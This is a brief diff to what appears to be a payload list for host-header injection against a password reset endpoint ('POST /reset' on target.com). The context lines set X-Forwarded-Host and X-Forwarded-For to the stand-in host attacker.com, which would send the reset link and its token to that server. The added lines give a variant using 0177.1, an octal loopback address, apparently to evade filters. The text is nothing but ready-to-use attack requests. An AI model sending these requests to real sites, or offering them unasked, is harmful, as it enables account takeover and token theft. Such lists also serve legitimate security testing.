@@ -64,4 +64,11 @@ POST /reset
 HOST: target.com
 X-FORWARDED-HOST: attacker.com
 X-FORWARDED-FOR: attacker.com
+
+
+
+POST /reset
+HOST: target.com
+X-FORWARDED-HOST: 0177.1
+X-FORWARDED-FOR: 0177.1
 ````
